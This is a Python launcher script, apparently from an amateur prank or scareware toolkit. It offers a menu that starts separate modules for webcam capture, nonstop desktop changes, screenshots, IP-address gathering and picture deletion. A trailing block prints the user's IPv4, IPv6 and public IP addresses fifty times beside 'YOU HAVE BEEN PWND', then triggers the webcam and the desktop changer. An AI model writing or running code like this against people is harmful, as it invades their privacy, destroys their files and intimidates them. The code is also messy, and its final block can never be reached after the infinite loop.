import os
import time

current_directory = os.getcwd()
print("working DIR:", current_directory)

while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    payload = input("Choose:\n1: install requirements\n2: webcam\n3: change Desktop nonstop\n4: take screenshot\n5: getting and printing Ip-adresses\n6: webrawler (work in progress)\n7: delete pictures\n8: toggle Background\n")
    match payload:
        case "1":
            from console import *
            run_command("pip install requests pillow opencv-python")
        case "2":
            path = current_directory + '\webcam.py'
            os.startfile(path)
        case "3":
            path = current_directory + '\changeDesktopNonstop.py'
            os.startfile(path)
        case "4":
            path = current_directory + '\\takeScreenshot.py'
            os.startfile(path)
        case "5":
            path = current_directory + '\gettingIpAdresses.py'
            os.startfile(path)
        case "6":
            print("placeholder...")
        case "7":
            path = current_directory + '\deletePictures.py'
            os.startfile(path)
        case "8":
            path = current_directory + '\\toggleBackground.py'
            os.startfile(path)    
        case _:
            print("wrong input")
        
        
        



os.startfile(path)



from console import *
run_command("pip install requests pillow opencv-python")

from gettingIpAdresses import *
print(ipv4_address,ipv6_address,public_ip_address)

def printingOutTimes(number):
    i = 0
    while i < number:
        i = i + 1
        print(f"YOU HAVE BEEN PWND:{ipv4_address}\nYOU HAVE BEEN PWND:{ipv6_address}\nYOU HAVE BEEN PWND:{public_ip_address}\n")
printingOutTimes(50)
#time.sleep(5)

from webcam import *
time.sleep(1)

from changeDesktopNonstop import *
changeDesktopNonstop()

time.sleep(10)
#from toggleBackground import *
#from takeScreenshot import *
#from changeDesktop import *





wait = input("")